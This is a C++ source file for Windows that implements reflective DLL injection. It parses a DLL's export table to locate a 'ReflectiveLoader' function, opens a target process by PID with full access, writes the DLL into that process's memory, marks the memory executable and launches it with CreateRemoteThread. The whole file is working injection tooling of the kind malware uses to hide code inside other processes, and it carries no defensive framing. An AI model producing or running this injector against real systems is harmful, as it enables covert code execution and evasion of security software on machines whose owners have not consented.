#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>

typedef unsigned long long DWORD64;

DWORD64 rva_to_offset(DWORD64 rva, DWORD64 base_address)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base_address;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base_address + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    if (rva < section->PointerToRawData) // pointer into PE header area
        return rva;

    for (; section->SizeOfRawData != 0; section++)
    {
        if (rva >= section->VirtualAddress && rva < (section->VirtualAddress + section->SizeOfRawData))
            return rva - section->VirtualAddress + section->PointerToRawData;
    }
    return 0;
}

DWORD64 get_reflective_loader_offset(DWORD64 base_address, LPCSTR ReflectiveLoader_name)
{
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);
    IMAGE_DATA_DIRECTORY exports_data_directory = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exports_data_directory.VirtualAddress == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)(base_address + rva_to_offset(exports_data_directory.VirtualAddress, base_address));
    DWORD* functions = (DWORD*)(base_address + rva_to_offset(export_directory->AddressOfFunctions, base_address));
    DWORD* names = (DWORD*)(base_address + rva_to_offset(export_directory->AddressOfNames, base_address));
    WORD* ords = (WORD*)(base_address + rva_to_offset(export_directory->AddressOfNameOrdinals, base_address));

    for (DWORD i = 0; i < export_directory->NumberOfNames; ++i)
    {
        char* name = (char*)(base_address + rva_to_offset(names[i], base_address));
        if (_stricmp(name, ReflectiveLoader_name) == 0) // case-insensitive helps during testing
        {
            DWORD func_rva = functions[ords[i]];
            return rva_to_offset(func_rva, base_address);
        }
    }
    return 0;
}

int main(int argc, char* argv[])
{
    if (argc != 3) {
        printf("Usage: %s <path/to/dll> <pid>\n", argv[0]);
        return 1;
    }

    std::string dllPath = argv[1];
    DWORD pid = (DWORD)atoi(argv[2]);

    // 1) open file
    HANDLE file_handle = CreateFileA(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE) { printf("CreateFile failed: %lu\n", GetLastError()); return 1; }
	printf("Injecting DLL '%s' into process %lu\n", dllPath.c_str(), (unsigned long)pid);

    // 2) get file size
    LARGE_INTEGER fileSize = { 0 };
    if (!GetFileSizeEx(file_handle, &fileSize)) { printf("GetFileSizeEx failed: %lu\n", GetLastError()); CloseHandle(file_handle); return 1; }
    SIZE_T sz = (SIZE_T)fileSize.QuadPart;
    if (sz == 0) { printf("Empty file\n"); CloseHandle(file_handle); return 1; }
	printf("DLL size: %llu bytes\n", (unsigned long long)sz);

    // 3) allocate buffer and read
    LPBYTE file_buf = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!file_buf) { printf("HeapAlloc failed\n"); CloseHandle(file_handle); return 1; }
    DWORD bytesRead = 0;
    if (!ReadFile(file_handle, file_buf, (DWORD)sz, &bytesRead, NULL) || bytesRead != (DWORD)sz) {
        printf("ReadFile failed or incomplete: %lu bytesRead=%lu\n", GetLastError(), bytesRead);
        HeapFree(GetProcessHeap(), 0, file_buf); CloseHandle(file_handle); return 1;
    }
    CloseHandle(file_handle);
	printf("DLL read into memory.\n");

    // 4) find reflective loader offset in raw file
    DWORD64 reflective_loader_offset = get_reflective_loader_offset((DWORD64)file_buf, "ReflectiveLoader");
    if (!reflective_loader_offset) { printf("ReflectiveLoader export not found\n"); HeapFree(GetProcessHeap(), 0, file_buf); return 1; }
	printf("ReflectiveLoader offset: 0x%llx\n", (unsigned long long)reflective_loader_offset);

    // 5) open target process
    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process_handle) { printf("OpenProcess failed: %lu\n", GetLastError()); HeapFree(GetProcessHeap(), 0, file_buf); return 1; }
	printf("Target process opened.\n");

    // 6) allocate remote memory (use the file size)
    LPVOID remote_file_buf_address = VirtualAllocEx(process_handle, NULL, sz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remote_file_buf_address) { printf("VirtualAllocEx failed: %lu\n", GetLastError()); CloseHandle(process_handle); HeapFree(GetProcessHeap(), 0, file_buf); return 1; }
	printf("Remote memory allocated at %p\n", remote_file_buf_address);

    // 7) write file into remote process
    SIZE_T written = 0;
    if (!WriteProcessMemory(process_handle, remote_file_buf_address, file_buf, sz, (SIZE_T*)&written) || written != sz) {
        printf("WriteProcessMemory failed: %lu written=%llu\n", GetLastError(), (unsigned long long)written);
        VirtualFreeEx(process_handle, remote_file_buf_address, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        HeapFree(GetProcessHeap(), 0, file_buf);
        return 1;
    }
	printf("DLL written into remote process memory.\n");

    // 8) make memory executable
    DWORD oldProt = 0;
    if (!VirtualProtectEx(process_handle, remote_file_buf_address, sz, PAGE_EXECUTE_READ, &oldProt)) {
        // If this fails, try PAGE_EXECUTE_READWRITE (some targets)
        VirtualProtectEx(process_handle, remote_file_buf_address, sz, PAGE_EXECUTE_READWRITE, &oldProt);
    }
	printf("Remote memory protection changed to executable.\n");

    // 9) compute remote address of reflective loader and create remote thread
    LPTHREAD_START_ROUTINE remote_start = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remote_file_buf_address + (ULONG_PTR)reflective_loader_offset);

    HANDLE thread_handle = CreateRemoteThread(process_handle, NULL, 0, remote_start, NULL, 0, NULL);
    if (!thread_handle) { printf("CreateRemoteThread failed: %lu\n", GetLastError()); VirtualFreeEx(process_handle, remote_file_buf_address, 0, MEM_RELEASE); CloseHandle(process_handle); HeapFree(GetProcessHeap(), 0, file_buf); return 1; }
	printf("Remote thread created.\n");

    WaitForSingleObject(thread_handle, INFINITE);
    CloseHandle(thread_handle);
    CloseHandle(process_handle);
    HeapFree(GetProcessHeap(), 0, file_buf);

    printf("done.\n");
    return 0;
}
